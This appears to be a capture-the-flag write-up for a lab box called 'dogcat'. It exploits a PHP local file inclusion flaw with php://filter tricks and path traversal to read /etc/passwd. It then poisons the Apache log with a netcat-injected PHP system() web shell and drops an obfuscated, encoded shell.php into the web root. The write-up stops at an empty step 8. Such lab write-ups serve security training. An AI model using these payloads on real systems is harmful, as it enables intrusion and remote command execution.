# dogcat

1. Recon reveals 22 and 80.
2. Going to the site (after running a dirb) reveals a simple site where you can view dog or cat images, via a query string `?view=`. Obvious LFI challenge
3. `php://filter/dog/convert.base64-encode/resource=dog` gets the base64 encoding of the dog and cat pages, which select a random image. Unfortunately, there is a whitelist: if dog or cat are not in the view url, it rejects it with 'only dogs or cats allowed'.
4. After a lot of messing about, I found this works (I don't know why. PHP ¯\_(ツ)_/¯): `http://10.10.177.45/?view=php://filter/dog/convert.base64-encode/resource=index`. It returns an error and the base64 of index :D

    This revealed that index is:

    ```php
    <?php
        function containsStr($str, $substr) {
            return strpos($str, $substr) !== false;
        }
        $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
        if(isset($_GET['view'])) {
            if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                echo 'Here you go!';
                include $_GET['view'] . $ext;
            } else {
                echo 'Sorry, only dogs or cats are allowed.';
            }
        }
    ?>
    ```

    Of note, I can specify the extension. So for example this works and gets me the passwd file: `?view=php://filter/dog/convert.base64-encode/resource=../../../../etc/passwd&ext=`

    Next step, how to exploit this? The passwd file revealed no users but www-data. A look at this blog (https://resources.infosecinstitute.com/local-file-inclusion-code-execution/) provided a possible option: utilising the apache log.

5. I used netcat to inject a php shell into the access logs: 

    ```
    root@kali:~# nc 10.10.148.44 80
    GET /<?php system($_GET['cmd']); ?>
    HTTP/1.1 400 Bad Request
    Date: Sun, 03 May 2020 02:20:10 GMT
    Server: Apache/2.4.38 (Debian)
    Content-Length: 302
    Connection: close
    Content-Type: text/html; charset=iso-8859-1

    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>400 Bad Request</title>
    </head><body>
    <h1>Bad Request</h1>
    <p>Your browser sent a request that this server could not understand.<br />
    </p>
    <hr>
    <address>Apache/2.4.38 (Debian) Server at 172.17.0.2 Port 80</address>
    </body></html>
    ```

6. I tested this by running `http://10.10.148.44/?view=php://filter/dog/resource=/var/log/apache2/access.log&ext=&cmd=cat%20/etc/passwd` which printed the contents of passwd to the screen (buried in the logs). Nice.

7. By using the script below as the cmd query string value, I created a `shell.php` in the web directory:

    `echo %50%47%5a%76%63%6d%30%67%62%57%56%30%61%47%39%6b%50%53%4a%48%52%56%51%69%49%47%35%68%62%57%55%39%49%6a%77%2f%63%47%68%77%49%47%56%6a%61%47%38%67%59%6d%46%7a%5a%57%35%68%62%57%55%6f%4a%46%39%54%52%56%4a%57%52%56%4a%62%4a%31%42%49%55%46%39%54%52%55%78%47%4a%31%30%70%4f%79%41%2f%50%69%49%2b%43%6a%78%70%62%6e%42%31%64%43%42%30%65%58%42%6c%50%53%4a%55%52%56%68%55%49%69%42%75%59%57%31%6c%50%53%4a%6a%62%57%51%69%49%47%6c%6b%50%53%4a%6a%62%57%51%69%49%48%4e%70%65%6d%55%39%49%6a%67%77%49%6a%34%4b%50%47%6c%75%63%48%56%30%49%48%52%35%63%47%55%39%49%6c%4e%56%51%6b%31%4a%56%43%49%67%64%6d%46%73%64%57%55%39%49%6b%56%34%5a%57%4e%31%64%47%55%69%50%67%6f%38%4c%32%5a%76%63%6d%30%2b%43%6a%78%77%63%6d%55%2b%43%6a%77%2f%63%47%68%77%43%69%41%67%49%43%42%70%5a%69%68%70%63%33%4e%6c%64%43%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4b%51%6f%67%49%43%41%67%65%77%6f%67%49%43%41%67%49%43%41%67%49%48%4e%35%63%33%52%6c%62%53%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4f%77%6f%67%49%43%41%67%66%51%6f%2f%50%67%6f%38%4c%33%42%79%5a%54%34%4b%50%48%4e%6a%63%6d%6c%77%64%44%35%6b%62%32%4e%31%62%57%56%75%64%43%35%6e%5a%58%52%46%62%47%56%74%5a%57%35%30%51%6e%6c%4a%5a%43%67%69%59%32%31%6b%49%69%6b%75%5a%6d%39%6a%64%58%4d%6f%4b%54%73%38%4c%33%4e%6a%63%6d%6c%77%64%44%34%3d | base64 -d > shell.php`

8. 